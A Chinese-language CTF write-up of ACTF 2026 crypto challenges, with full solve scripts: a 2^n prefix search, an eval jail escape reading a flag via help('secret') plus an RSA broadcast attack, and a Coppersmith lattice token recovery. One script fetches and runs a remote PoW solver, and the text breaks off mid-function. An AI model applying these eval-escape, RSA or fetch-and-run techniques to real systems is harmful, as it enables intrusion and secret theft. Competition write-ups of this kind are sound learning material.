+++
date = '2026-05-12T00:00:00+08:00'
draft = false
title = 'ACTF 2026 Writeup'
type = 'posts'
+++

# ACTF2026 Writeup By F1ux

经过队内师傅们的努力，本次我们取得了第四的好成绩！

![](img/ACTF2026/ACTF2026.png)

## Crypto

### inverse pow

#### 1. 程序分析

逆向后程序主要做了下面几件事：

```Go
m := rand.Int(1, 99999999)
fmt.Printf("m = %d\n", m)
fmt.Print("n = ")

n, _ := strconv.Atoi(readline())
x := new(big.Int).Exp(big.NewInt(2), big.NewInt(int64(n)), nil)

if strings.HasPrefix(x.String(), strconv.Itoa(m)) {
    fmt.Println("Verified")
} else {
    fmt.Println("Failed")
}
```

远程服务还套了一层认证Team认证，认证通过后需要连续完成 8 轮

```Plain
ROUND 1 / 8
m = ...
n =
```

#### 2. 数学转换

直接暴力等 `m` 本身是 2 的幂不现实。条件其实是：

```Plain
str(2^n).startswith(str(m))
```

设：alpha = log10(2)有：2^n = 10^(n * alpha)，一个数的十进制前缀由 `log10` 的小数部分决定。若 `m` 有 `d` 位，那么 `2^n` 以 `m` 开头等价于：

```Plain
log10(m) - (d - 1) <= frac(n * log10(2)) < log10(m + 1) - (d - 1)
```

也就是说，只需要找最小的 `n`，让 `{n * log10(2)}` 落入这个区间。

#### 3. 实现细节

直接用 `float` 或 `long double` 循环累加会有精度问题，特别是 `n` 到几千万之后，边界附近很容易误判。例如 `m = 48392012` 时，低精度实现可能找到错误的 `n`。

最终脚本采用两步：

1. 用 C helper 做 128-bit 定点扫描，速度足够快；
2. 用 Python `Decimal` 高精度复核候选值。

区间右端必须严格开区间。例如 `m = 3` 时，不能接受 `n = 2`，因为 `2^2 = 4`。所以验证条件写成：

```Plain
lo - eps <= frac < hi
```

只给左边界一点容差，右边界保持严格。

#### 4. Exp

```Python
#!/usr/bin/env python3
import argparse
import os
import re
import socket
import subprocess
import tempfile
from decimal import ROUND_CEILING, ROUND_FLOOR, ROUND_HALF_EVEN, Decimal, getcontext
from pathlib import Path


HOST = "1.95.44.158"
PORT = 11314


class RateLimitError(RuntimeError):
    pass


SEARCH_C = r"""
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static __uint128_t parse_u128_hex(const char *s) {
    __uint128_t x = 0;
    for (; *s; s++) {
        unsigned v;
        if (*s >= '0' && *s <= '9') v = (unsigned)(*s - '0');
        else if (*s >= 'a' && *s <= 'f') v = (unsigned)(*s - 'a' + 10);
        else if (*s >= 'A' && *s <= 'F') v = (unsigned)(*s - 'A' + 10);
        else continue;
        x = (x << 4) | v;
    }
    return x;
}

int main(int argc, char **argv) {
    if (argc != 8) {
        fprintf(stderr, "usage: %s <alpha_hex> <lo_hex> <hi_hex|mod> <digits> <start> <start_intpart> <limit>\n", argv[0]);
        return 2;
    }

    __uint128_t alpha = parse_u128_hex(argv[1]);
    __uint128_t lo = parse_u128_hex(argv[2]);
    int hi_is_mod = strcmp(argv[3], "mod") == 0;
    __uint128_t hi = hi_is_mod ? 0 : parse_u128_hex(argv[3]);
    uint64_t digits = strtoull(argv[4], NULL, 10);
    uint64_t start = strtoull(argv[5], NULL, 10);
    uint64_t intpart = strtoull(argv[6], NULL, 10);
    uint64_t limit = strtoull(argv[7], NULL, 10);
    __uint128_t f = alpha * ((__uint128_t)start);

    for (uint64_t n = start; n <= limit; n++) {
        if (intpart + 1 >= digits && f >= lo && (hi_is_mod || f < hi)) {
            printf("%llu\n", (unsigned long long)n);
            return 0;
        }
        __uint128_t old = f;
        f += alpha;
        if (f < old) {
            intpart++;
        }
    }

    return 1;
}
"""


def build_searcher() -> Path:
    cache = Path(tempfile.gettempdir()) / "inverse_pow_prefix_search"
    src = cache.with_suffix(".c")
    if cache.exists() and src.exists() and src.read_text() == SEARCH_C:
        return cache
    src.write_text(SEARCH_C)
    subprocess.run(
        ["cc", "-O3", str(src), "-lm", "-o", str(cache)],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return cache


def verify_prefix(m: int, n: int) -> bool:
    getcontext().prec = 120
    alpha = Decimal(2).log10()
    d = len(str(m))
    frac = (Decimal(n) * alpha) % 1
    lo = Decimal(m).log10() - (d - 1)
    hi = Decimal(m + 1).log10() - (d - 1)
    digits = int((Decimal(n) * alpha).to_integral_value(rounding="ROUND_FLOOR")) + 1
    eps = Decimal(10) ** -60
    return digits >= d and lo - eps <= frac < hi


def fixed_params(m: int):
    getcontext().prec = 140
    bits = 128
    mod_int = 1 << bits
    mod_dec = Decimal(mod_int)
    alpha = Decimal(2).log10()
    d = len(str(m))
    lo_dec = Decimal(m).log10() - (d - 1)
    hi_dec = Decimal(m + 1).log10() - (d - 1)
    margin = 1 << 34

    alpha_i = int((alpha * mod_dec).to_integral_value(rounding=ROUND_HALF_EVEN))
    lo_i = int((lo_dec * mod_dec).to_integral_value(rounding=ROUND_CEILING))
    hi_i = int((hi_dec * mod_dec).to_integral_value(rounding=ROUND_CEILING))
    lo_i = max(0, lo_i - margin)
    hi_i = min(mod_int, hi_i + margin)
    return d, alpha, f"{alpha_i:032x}", f"{lo_i:032x}", "mod" if hi_i == mod_int else f"{hi_i:032x}"


def find_exponent(m: int, limit: int) -> int:
    searcher = build_searcher()
    d, alpha, alpha_hex, lo_hex, hi_hex = fixed_params(m)
    start = 0
    while start <= limit:
        start_intpart = int((Decimal(start) * alpha).to_integral_value(rounding=ROUND_FLOOR))
        proc = subprocess.run(
            [str(searcher), alpha_hex, lo_hex, hi_hex, str(d), str(start), str(start_intpart), str(limit)],
            check=False,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        if proc.returncode != 0 or not proc.stdout.strip():
            raise RuntimeError(f"no exponent found up to {limit}")
        n = int(proc.stdout.strip().splitlines()[0])
        if verify_prefix(m, n):
            return n
        start = n + 1
    raise RuntimeError(f"no verified exponent found up to {limit}")


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def solve_remote(team: str, token: str, limit: int, rounds: int, host: str = HOST, port: int = PORT) -> bytes:
    with socket.create_connection((host, port), timeout=15) as sock:
        sock.settimeout(75)
        transcript = bytearray()

        transcript.extend(recv_until(sock, b"Team:"))
        sock.sendall(team.encode() + b"\n")

        transcript.extend(recv_until(sock, b"Token:"))
        sock.sendall(token.encode() + b"\n")

        for round_idx in range(1, rounds + 1):
            transcript.extend(recv_until(sock, b"n = "))
            ms = re.findall(rb"m = (\d+)", transcript)
            if len(ms) < round_idx:
                text = transcript.decode(errors="replace")
                if "Rate limit exceeded" in text:
                    raise RateLimitError(text)
                raise RuntimeError(text)

            m = int(ms[-1])
            n = find_exponent(m, limit)
            print(f"[+] round {round_idx}/{rounds}: m = {m}, n = {n}")
            sock.sendall(str(n).encode() + b"\n")

        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            transcript.extend(chunk)
        return bytes(transcript)


def main() -> None:
    parser = argparse.ArgumentParser(description="Solve inverse_pow remote challenge.")
    parser.add_argument("--team", default=os.getenv("CTF_TEAM"), help="team name")
    parser.add_argument("--token", default=os.getenv("CTF_TOKEN"), help="team token")
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--limit", type=int, default=2_000_000_000)
    parser.add_argument("--rounds", type=int, default=8)
    args = parser.parse_args()

    if not args.team or not args.token:
        raise SystemExit("pass --team/--token or set CTF_TEAM/CTF_TOKEN")

    try:
        out = solve_remote(args.team, args.token, args.limit, args.rounds, args.host, args.port)
    except RateLimitError as exc:
        print("[!] Remote rate limit is still active.")
        print("[!] Stop retrying and wait at least 10 minutes with no team/token connections.")
        print(exc)
        raise SystemExit(2)
    print(out.decode(errors="replace"))


if __name__ == "__main__":
    main()
```

### OhMyCaptcha

#### **关键代码**

题目把我们输入的整数转成 bytes 后放进 `eval`：

```Python
template = f"key = {key!r}\ncipher_with_key_{key}_{nonce} = {cipher!r}\nprint(eval({long_to_bytes(message)}))"
```

验证逻辑为：

```Python
0 <= message < prod(self.pn) and all(str(message % p) in self.code for p in self.pn)
```

`self.code` 是 `random.sample("0123456789", 10)`，也就是 10 个数字的随机排列；单数字 `0` 到 `9` 一定都在验证码里。

#### **利用思路**

##### **1. jail 非预期读 flag**

直接用：

```Python
help('secret')#!.
```

原因：

- `eval` 环境没有禁用 builtins。
- `help('secret')` 会通过 pydoc 展示 `secret` 模块文档。
- `secret.py` 里有 `FLAG`，pydoc 的 `DATA` 区会打印它。
- `#!.` 是注释，不影响 Python 表达式，只用于调整数取模结果。

该 payload 的整数为：

```Plain
35524181230223809994941559661000950751534
```

选择 4 个合法手机号码素数：

```Plain
17625083317 -> payload % p = 0
12776258639 -> payload % p = 9
19732306117 -> payload % p = 42
17510652739 -> payload % p = 53
```

所以只要验证码中包含子串 `42` 和 `53` 即可通过；`0` 和 `9` 是单数字，必定通过。脚本不断重连，直到遇到满足条件的验证码。

##### **2. 低指数 RSA 广播恢复明文**

服务端返回的是：

```Python
pow(bytes_to_long(output.strip()), 5, n)
```

每次连接都会生成新的 RSA 模数 `n`，但 payload 相同，所以 `help('secret')#!.` 的输出明文相同。RSA 无 padding 且 `e = 5`，因此可以收集多组：

```Plain
c_i = m^5 mod n_i
```

当 `N = product(n_i) > m^5` 时，用 CRT 合并得到真正的 `m^5`，再开整数五次方根得到 `m`。实际收集约 12 组即可。

EXP：

```Python
#!/usr/bin/env python3
import re
import socket
import time
from math import gcd

HOST, PORT = "1.95.137.55", 9999
SRC = b"help('secret')#!."
MSG = int.from_bytes(SRC, "big")
PHONES = [17625083317, 12776258639, 19732306117, 17510652739]
PHONE_LINE = (" ".join(map(str, PHONES)) + "\n").encode()
NEED = 12

# MSG % PHONES == [0, 9, 42, 53]. 0/9 always appear in the 10-digit permutation,
# so a connection is usable iff the captcha contains substrings "42" and "53".
assert [MSG % p for p in PHONES] == [0, 9, 42, 53]

def recv_until(sock, mark):
    data = b""
    while mark not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def one_try():
    try:
        with socket.create_connection((HOST, PORT), timeout=8) as s:
            s.settimeout(8)
            recv_until(s, b": ")
            s.sendall(PHONE_LINE)

            data = recv_until(s, b"valid for 1 minute.\n")
            m = re.search(rb"\] ([0-9]{10}) is your group verification code", data)
            if not m:
                return None
            code = m.group(1)
            if b"42" not in code or b"53" not in code:
                return None

            if b"> " not in data:
                data += recv_until(s, b"> ")
            n = int(re.search(rb"n\s*=\s*(\d+)", data).group(1))

            s.sendall(str(MSG).encode() + b"\n")
            line = recv_until(s, b"\n")
            if b"Verification failed" in line:
                return None
            c = int(re.search(rb"[0-9a-f]+", line).group(0), 16)
            return n, c, code.decode()
    except (OSError, TimeoutError, AttributeError, ValueError):
        # 远端偶发连接超时/断开很常见，直接丢掉本轮继续重连。
        time.sleep(0.2)
        return None

def crt(items):
    x, mod = 0, 1
    for n, c in items:
        if gcd(mod, n) != 1:
            continue
        t = ((c - x) % n) * pow(mod, -1, n) % n
        x += mod * t
        mod *= n
        x %= mod
    return x, mod

def iroot5(x):
    lo, hi = 0, 1 << ((x.bit_length() + 4) // 5 + 1)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if mid**5 <= x:
            lo = mid
        else:
            hi = mid - 1
    return lo, lo**5 == x

def main():
    items, tries = [], 0
    while True:
        tries += 1
        res = one_try()
        if not res:
            if tries % 100 == 0:
                print(f"[*] tried={tries}, hits={len(items)}")
            continue
        n, c, code = res
        items.append((n, c))
        print(f"[+] hit {len(items)}/{NEED}: try={tries}, code={code}, nbits={n.bit_length()}")

        if len(items) >= NEED:
            x, mod = crt(items)
            m, ok = iroot5(x)
            if ok:
                pt = m.to_bytes((m.bit_length() + 7) // 8, "big")
                flag = re.search(rb"ACTF\{[^}]+\}", pt).group(0)
                print(flag.decode())
                return
            print(f"[-] CRT modulus too small or root not exact, bits={mod.bit_length()}")

if __name__ == "__main__":
    main()
```

![](../img/ACTF2026/image.png)

### Pand√ra

题目给了一个 Sage 脚本和一个交互服务： 1.95.80.34 9999

核心代码如下：

```Python
FLAG = b"actf{redacted}"
while (p:=random_prime(2**512))%4 != 3:
    continue
q = random_prime(2**512)
K = QuadraticField(-p, 'w')
R = RealField(2333)
ΔΚ, Δq = -p, -p*q**2
OK = K.maximal_order()
Oq = K.order([1, (Δq+q*K.gen())/2])

token = os.urandom(45)
α = OK.ideal(int(token[:30].hex(),16)+\
             int(token[30:].hex(),16)*K.gen())

a, b, c = list(α.quadratic_form())
A, B = a, b*q%(2*a)
if B >= a: B -= 2*a
h = Oq.ideal([A, (-B + q*K.gen())/2]).quadratic_form()
ζ = list(h.reduced_form())[:2]; ζ[0] >>= 360
λ = f"{R(-Δq).sqrt():.470f}".split('.')[1]

if bytes.fromhex(input(f"{ζ, λ}\n[token]: ")) == token:
    print("^_^ >🚩", FLAG)
```

服务输出的是：([A >> 360, B], decimal_part_of_sqrt(p*q^2)) ，需要反推出那一轮的 45 字节 `token`。

#### 1. 从小数部分恢复 `N = p*q^2`

`λ` 是 `sqrt(p*q^2)` 的小数部分，保留了 470 位。设

```Plain
sqrt(N) = n + r / 10^470 + tiny
```

其中 `r` 是服务给出的 470 位小数整数，`n = floor(sqrt(N))`。展开：

```Plain
N = n^2 + 2*n*(r/10^470) + (r/10^470)^2 + tiny
```

把分母乘掉，可以得到一个二维近似关系：

```Plain
r^2 + 2*n*r*L + (n^2 - N)*L^2 ≈ 0
L = 10^470
```

所以只要在格 (L, rL), (0, L^2) 里找离 `(0, -r^2)` 最近的点，就能恢复 `2n` 和 `n^2 - N`，从而拿到精确的 `N`。这里维度只有 2，普通 LLL 加一个很小的局部枚举就够。

```Java
def round_div(num, den):
    if den < 0:
        num, den = -num, -den
    if num >= 0:
        return (2 * num + den) // (2 * den)
    return -((-2 * num + den) // (2 * den))


def cvp2(rows, target, radius=10):
    red = matrix(ZZ, rows).LLL()
    b1 = (ZZ(red[0, 0]), ZZ(red[0, 1]))
    b2 = (ZZ(red[1, 0]), ZZ(red[1, 1]))
    tx, ty = map(ZZ, target)
    x1, y1 = b1
    x2, y2 = b2
    det = x1 * y2 - x2 * y1
    c1 = round_div(tx * y2 - x2 * ty, det)
    c2 = round_div(x1 * ty - tx * y1, det)

    best = None
    for i in range(int(c1) - radius, int(c1) + radius + 1):
        for j in range(int(c2) - radius, int(c2) + radius + 1):
            vx = i * x1 + j * x2
            vy = i * y1 + j * y2
            dist = (vx - tx) ** 2 + (vy - ty) ** 2
            if best is None or dist < best[0]:
                best = (dist, vx, vy)
    return best


def recover_N(lambda_digits):
    L = ZZ(10) ** len(lambda_digits)
    r = ZZ(lambda_digits)
    _, vx, vy = cvp2([(L, r * L), (0, L * L)], (0, -r * r))
    two_n = vx // L
    const = (vy - two_n * r * L) // (L * L)
    n = two_n // 2
    return n * n - const
```

#### 2. 恢复完整二次型 [A, B, C]

服务只泄露了 `A >> 360` 和完整的 `B`。令服务内部 reduced form 的完整系数为 `[A, B, C]`，它的判别式是：

```Plain
B^2 - 4AC = -p*q^2 = -N
```

所以：

```Plain
A*C = (B^2 + N) / 4
```

右边记为 `S`。我们知道 `A` 的高位，未知低 360 位：

```Plain
A = A0 + x
A0 = (A >> 360) << 360
0 <= x < 2^360
```

于是问题变成了 known high bits factorization：已知 `S = A*C`，已知因子 `A` 的高位，求低位 `x`。

用单变量 Coppersmith 构造：

```Plain
f(x) = A0 + x
f(x) ≡ 0 mod A
A | S
```

这里 `A` 大概是 `S^0.49` 量级，`x < 2^360`，参数稍微调一下就可以稳定跑出来。实战时如果某一轮 `A` 偏小，条件会贴边；我直接重连，等一个 `A >> 360` 位数足够大的样本。

```SQL
def recover_A_factor(S, A_hi, xbits=360, beta=0.491, epsilon=0.0058):
    A0 = ZZ(A_hi) << xbits
    X = ZZ(2) ** xbits
    R = PolynomialRing(ZZ, "x")
    x = R.gen()
    f = x + A0

    beta = RR(beta)
    epsilon = RR(epsilon)
    m = max((beta**2 / epsilon).ceil(), (7 * beta).ceil())
    t = int((m * (1 / beta - 1)).floor())

    shifts = [S ** (m - i) * f**i for i in range(m)]
    shifts.extend([x**i * f**m for i in range(t)])

    basis = matrix(ZZ, len(shifts), m + max(1, t))
    for row, poly in enumerate(shifts):
        for col in range(poly.degree() + 1):
            basis[row, col] = ZZ(poly[col]) * X**col

    reduced = flatter_reduce(basis)
    for row in range(min(reduced.nrows(), 24)):
        h = R([ZZ(reduced[row, col]) // X**col for col in range(reduced.ncols())])
        for root, _ in h.roots():
            root = ZZ(root)
            A = A0 + root
            if 0 <= root < X and S % A == 0:
                return A, root
    raise RuntimeError("no A root found")
```

恢复出 `A` 后： 到这里已经拿到了完整的 reduced form `[A, B, C]`，但是还没分解 `N`。

```Plain
S = (B * B + N) // 4
A, low = recover_A_factor(S, A_hi)
C = S // A
assert B * B - 4 * A * C == -N
```

#### 3. 用齐次 Coppersmith 找到 q

这一步是题目的核心。对于恢复出来的二次型，有关系：

```Plain
A*m^2 - B*m*v + C*v^2 = q^2
```

而 `m, v` 都很小，实测大概 120 bit 左右。因为 `q^2 | N`，所以上式等价于：

```Plain
A*m^2 - B*m*v + C*v^2 ≡ 0 mod q^2
```

其中 `q^2` 是 `N = p*q^2` 的未知大因子。

把二次型除以 `A`，在模 `N` 下做 monic normalization：

```Plain
F(x, y) = x^2 + b0*x*y + c0*y^2 mod N
b0 = -B * A^(-1) mod N
c0 =  C * A^(-1) mod N
```

现在 `(m, v)` 是 `F(x, y)` 模未知因子 `q^2` 的小根。这和 Castagnos/Joux/Laguillaumie/Nguyen 的 `pq^2` quadratic form attack 是同一个形状。这里要用齐次 Coppersmith，而不是普通二元 Coppersmith。

取 `delta = 2`，参数 `m = 10, t = 15, t0 = t - m`。构造这些齐次多项式

```Plain
g_{i,j} = x^j * y^(delta*(t-i)-j) * F(x,y)^i * N^(m-i)
          0 <= i < m, 0 <= j < delta

h_i     = x^i * y^(delta*t0-i) * F(x,y)^m
          0 <= i <= delta*t0
```

它们都是总次数 `2t` 的齐次多项式。把系数按

```Plain
x^0*y^(2t), x^1*y^(2t-1), ..., x^(2t)
```

排成矩阵，做格约简。短向量给出的齐次多项式会在真实 `(m, v)` 上消失。因为它是齐次的，把 `r = x/y` 代进去变成一元多项式，求有理根即可。

拿到候选 `(num, den)` 后，直接检查：

```Plain
val = A*num^2 - B*num*den + C*den^2
g = gcd(val, N)
```

如果 `g` 是平方，基本就是 `q^2`。：

```Python
def homogeneous_coppersmith(N, A, B, C, m=10, t=15):
    N, A, B, C = map(ZZ, (N, A, B, C))
    delta = 2
    t0 = t - m
    if t0 < 0:
        raise ValueError("need t >= m")

    R = PolynomialRing(ZZ, ("x", "y"))
    x, y = R.gens()
    ainv = inverse_mod(A, N)
    b0 = ZZ((-B * ainv) % N)
    c0 = ZZ((C * ainv) % N)
    f = x**2 + b0 * x * y + c0 * y**2
    degree = delta * t

    shifts = []
    for i in range(m):
        for j in range(delta):
            shifts.append(x**j * y ** (delta * (t - i) - j) * f**i * N ** (m - i))
    for i in range(delta * t0 + 1):
        shifts.append(x**i * y ** (delta * t0 - i) * f**m)

    monoms = [x**i * y ** (degree - i) for i in range(degree + 1)]
    basis = matrix(ZZ, len(shifts), len(monoms))
    for row, poly in enumerate(shifts):
        for col, mon in enumerate(monoms):
            basis[row, col] = ZZ(poly.monomial_coefficient(mon))

    red = flatter_reduce(basis)
    U = PolynomialRing(QQ, "r")
    candidates = []
    for row in range(red.nrows()):
        if all(red[row, col] == 0 for col in range(red.ncols())):
            continue
        h = R(sum(ZZ(red[row, col]) * monoms[col] for col in range(len(monoms))))
        hr = U([QQ(h.monomial_coefficient(x**i * y ** (degree - i))) for i in range(degree + 1)])
        for root, _ in hr.roots():
            root = QQ(root)
            num = ZZ(root.numerator())
            den = ZZ(root.denominator())
            if den < 0:
                num, den = -num, -den
            if den == 0 or gcd(num, den) != 1:
                continue
            val = A * num**2 - B * num * den + C * den**2
            g = gcd(abs(val), N)
            if 1 < g < N:
                candidates.append((num, den, g, row))
    return candidates
```

#### 4. 从 (m, v, q) 还原 token

由

```Plain
A*m^2 - B*m*v + C*v^2 = q^2
```

两边乘 `4A` 并配方：

```Plain
(2*A*m - B*v)^2 + (4AC - B^2)*v^2 = 4A*q^2
```

又因为 `4AC - B^2 = N = p*q^2`，所以：

```Plain
X = (2*A*m - B*v) / q
X^2 + p*v^2 = 4A
```

另一方面，token 分成两段：

```Plain
hi = int(token[:30].hex(), 16)
lo = int(token[30:].hex(), 16)
```

原始理想里有一个很小的公共缩放。去掉它之后满足：

```Plain
d = gcd(hi - lo, 2*lo)
X = 2*hi / d
v = 2*lo / d
```

反过来枚举 `d` 就能还原 token：

```Plain
hi = d*X/2 < 2^240
lo = d*v/2 < 2^120
gcd(hi - lo, 2*lo) = d
```

`d` 的范围非常小，通常只有一个候选。

```Java
def candidate_tokens(A, B, C, N, m, v, q):
    A, B, C, N, m, v, q = map(ZZ, (A, B, C, N, m, v, q))
    q = abs(q)
    if q == 0 or N % (q * q) != 0:
        return []

    p = N // (q * q)
    num = 2 * A * m - B * v
    if num % q:
        return []
    X = num // q
    if X < 0:
        X = -X
        v = -v
    v = abs(v)

    if X * X + p * v * v != 4 * A:
        return []

    xmax = ZZ(1) << 240
    ymax = ZZ(1) << 120
    dmax = min((2 * (xmax - 1)) // X, (2 * (ymax - 1)) // v)

    out = []
    for d in range(1, int(dmax) + 1):
        if (d * X) % 2 or (d * v) % 2:
            continue
        hi = d * X // 2
        lo = d * v // 2
        if not (0 <= hi < xmax and 0 <= lo < ymax):
            continue
        if gcd(hi - lo, 2 * lo) != d:
            continue
        token = int(hi).to_bytes(30, "big") + int(lo).to_bytes(15, "big")
        out.append(token.hex())
    return out
```

#### 5. 完整Exp

本地用了 `SageMath`、`fpylll` 和 `flatter`。`flatter` 不是必须的数学条件，但不用它会慢很多。下面脚本里的 `FLATTER` 路径按自己的机器改一下即可。

```Python
#!/usr/bin/env sage
from sage.all import *
from fpylll import IntegerMatrix

import argparse
import ast
import os
import pathlib
import re
import socket
import subprocess
import tempfile
import time
import urllib.request


HOST = "1.95.80.34"
PORT = 9999
POW_SOLVER = pathlib.Path("/tmp/kctf_pow.py")
FLATTER = "/tmp/flatter/build/bin/flatter"


def flatter_reduce(mat):
    env = os.environ.copy()
    env["PATH"] = str(pathlib.Path(FLATTER).parent) + ":" + env.get("PATH", "")
    extra_libs = [
        str(pathlib.Path(FLATTER).parent.parent / "lib"),
        os.environ.get("SAGE_LOCAL", "") + "/lib" if os.environ.get("SAGE_LOCAL") else "",
        "/opt/homebrew/opt/libomp/lib",
    ]
    extra_libs = [x for x in extra_libs if x]
    for key in ("DYLD_LIBRARY_PATH", "LD_LIBRARY_PATH"):
        env[key] = ":".join(extra_libs + [env.get(key, "")])
    with tempfile.TemporaryDirectory() as td:
        inp = os.path.join(td, "basis.txt")
        out = os.path.join(td, "basis_out.txt")
        body = "\n".join(" ".join(line.split()) for line in mat.str().split("\n"))
        with open(inp, "w", encoding="utf-8") as fp:
            fp.write("[\n" + body + "\n]")
        proc = subprocess.run(
            [FLATTER, inp, out],
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=900,
        )
        if proc.returncode != 0:
            raise RuntimeError(proc.stderr + proc.stdout)
        return matrix(IntegerMatrix.from_file(out))


def round_div(num, den):
    if den < 0:
        num, den = -num, -den
    if num >= 0:
        return (2 * num + den) // (2 * den)
    return -((-2 * num + den) // (2 * den))


def cvp2(rows, target, radius=10):
    red = matrix(ZZ, rows).LLL()
    b1 = (ZZ(red[0, 0]), ZZ(red[0, 1]))
    b2 = (ZZ(red[1, 0]), ZZ(red[1, 1]))
    tx, ty = map(ZZ, target)
    x1, y1 = b1
    x2, y2 = b2
    det = x1 * y2 - x2 * y1
    c1 = round_div(tx * y2 - x2 * ty, det)
    c2 = round_div(x1 * ty - tx * y1, det)

    best = None
    for i in range(int(c1) - radius, int(c1) + radius + 1):
        for j in range(int(c2) - radius, int(c2) + radius + 1):
            vx = i * x1 + j * x2
            vy = i * y1 + j * y2
            dist = (vx - tx) ** 2 + (vy - ty) ** 2
            if best is None or dist < best[0]:
                best = (dist, vx, vy)
    return best


def recover_N(lambda_digits):
    L = ZZ(10) ** len(lambda_digits)
    r = ZZ(lambda_digits)
    _, vx, vy = cvp2([(L, r * L), (0, L * L)], (0, -r * r))
    two_n = vx // L
    const = (vy - two_n * r * L) // (L * L)
    n = two_n // 2
    return n * n - const


def recover_A_factor(S, A_hi, xbits=360, beta=0.491, epsilon=0.0058):
    A0 = ZZ(A_hi) << xbits
    X = ZZ(2) ** xbits
    R = PolynomialRing(ZZ, "x")
    x = R.gen()
    f = x + A0

    beta = RR(beta)
    epsilon = RR(epsilon)
    m = max((beta**2 / epsilon).ceil(), (7 * beta).ceil())
    t = int((m * (1 / beta - 1)).floor())
    print(f"[*] A-Coppersmith m={m} t={t} dim={m+t}", flush=True)

    shifts = [S ** (m - i) * f**i for i in range(m)]
    shifts.extend([x**i * f**m for i in range(t)])

    basis = matrix(ZZ, len(shifts), m + max(1, t))
    for row, poly in enumerate(shifts):
        for col in range(poly.degree() + 1):
            basis[row, col] = ZZ(poly[col]) * X**col

    red = flatter_reduce(basis)
    for row in range(min(red.nrows(), 24)):
        h = R([ZZ(red[row, col]) // X**col for col in range(red.ncols())])
        for root, _ in h.roots():
            root = ZZ(root)
            A = A0 + root
            if 0 <= root < X and S % A == 0:
                return A
    raise RuntimeError("A not recovered")


def recover_form(prompt_line):
    zeta, lambda_digits = ast.literal_eval(prompt_line)
    A_hi, B = map(ZZ, zeta)
    N = recover_N(lambda_digits)
    S = (B * B + N) // 4
    A = recover_A_factor(S, A_hi)
    C = S // A
    assert B * B - 4 * A * C == -N
    return A, B, C, N


def homogeneous_coppersmith(N, A, B, C, m=10, t=15):
    N, A, B, C = map(ZZ, (N, A, B, C))
    delta = 2
    t0 = t - m
    if t0 < 0:
        raise ValueError("need t >= m")

    R = PolynomialRing(ZZ, ("x", "y"))
    x, y = R.gens()
    ainv = inverse_mod(A, N)
    b0 = ZZ((-B * ainv) % N)
    c0 = ZZ((C * ainv) % N)
    f = x**2 + b0 * x * y + c0 * y**2
    degree = delta * t

    shifts = []
    for i in range(m):
        for j in range(delta):
            shifts.append(x**j * y ** (delta * (t - i) - j) * f**i * N ** (m - i))
    for i in range(delta * t0 + 1):
        shifts.append(x**i * y ** (delta * t0 - i) * f**m)

    monoms = [x**i * y ** (degree - i) for i in range(degree + 1)]
    basis = matrix(ZZ, len(shifts), len(monoms))
    for row, poly in enumerate(shifts):
        for col, mon in enumerate(monoms):
            basis[row, col] = ZZ(poly.monomial_coefficient(mon))

    red = flatter_reduce(basis)
    U = PolynomialRing(QQ, "r")
    out = []
    for row in range(red.nrows()):
        if all(red[row, col] == 0 for col in range(red.ncols())):
            continue
        h = R(sum(ZZ(red[row, col]) * monoms[col] for col in range(len(monoms))))
        hr = U([QQ(h.monomial_coefficient(x**i * y ** (degree - i))) for i in range(degree + 1)])
        for root, _ in hr.roots():
            root = QQ(root)
            num = ZZ(root.numerator())
            den = ZZ(root.denominator())
            if den < 0:
                num, den = -num, -den
            if den == 0 or gcd(num, den) != 1:
                continue
            val = A * num**2 - B * num * den + C * den**2
            g = gcd(abs(val), N)
            if 1 < g < N:
                out.append((num, den, g, row))
    return out


def candidate_tokens(A, B, C, N, m, v, q):
    q = abs(ZZ(q))
    if q == 0 or N % (q * q) != 0:
        return []

    p = N // (q * q)
    num = 2 * A * m - B * v
    if num % q:
        return []
    X = num // q
    if X < 0:
        X = -X
        v = -v
    v = abs(v)

    if X * X + p * v * v != 4 * A:
        return []

    xmax = ZZ(1) << 240
    ymax = ZZ(1) << 120
    dmax = min((2 * (xmax - 1)) // X, (2 * (ymax - 1)) // v)

    ans = []
    for d in range(1, int(dmax) + 1):
        if (d * X) % 2 or (d * v) % 2:
            continue
        hi = d * X // 2
        lo = d * v // 2
        if not (0 <= hi < xmax and 0 <= lo < ymax):
            continue
        if gcd(hi - lo, 2 * lo) != d:
            continue
        token = int(hi).to_bytes(30, "big") + int(lo).to_bytes(15, "big")
        ans.append(token.hex())
    return ans


def recover_token(prompt_line):
    A, B, C, N = recover_form(prompt_line)
    print(f"[+] form bits: A={A.nbits()} B={ZZ(abs(B)).nbits()} C={C.nbits()} N={N.nbits()}", flush=True)

    cands = homogeneous_coppersmith(N, A, B, C)
    print(f"[+] homogeneous candidates: {len(cands)}", flush=True)
    for m0, v0, g, row in cands:
        val = A * m0**2 - B * m0 * v0 + C * v0**2
        if val <= 0 or val != g or not ZZ(g).is_square():
            continue
        q = isqrt(ZZ(g))
        print(f"[*] row={row} m_bits={ZZ(abs(m0)).nbits()} v_bits={ZZ(abs(v0)).nbits()} q_bits={q.nbits()}", flush=True)
        for sm in (ZZ(1), ZZ(-1)):
            for sv in (ZZ(1), ZZ(-1)):
                tokens = candidate_tokens(A, B, C, N, sm * m0, sv * v0, q)
                if tokens:
                    return tokens[0]
    raise RuntimeError("token not found")


def ensure_pow_solver():
    if not POW_SOLVER.exists():
        POW_SOLVER.write_bytes(urllib.request.urlopen("https://goo.gle/kctf-pow", timeout=30).read())
    return POW_SOLVER


def solve_pow(chal):
    out = subprocess.check_output(["python3", str(ensure_pow_solver()), "solve", chal], text=True)
    return [line.strip() for line in out.splitlines() if line.strip()][-1]


def recv_until(sock, marker, timeout=30.0):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def parse_prompt(text):
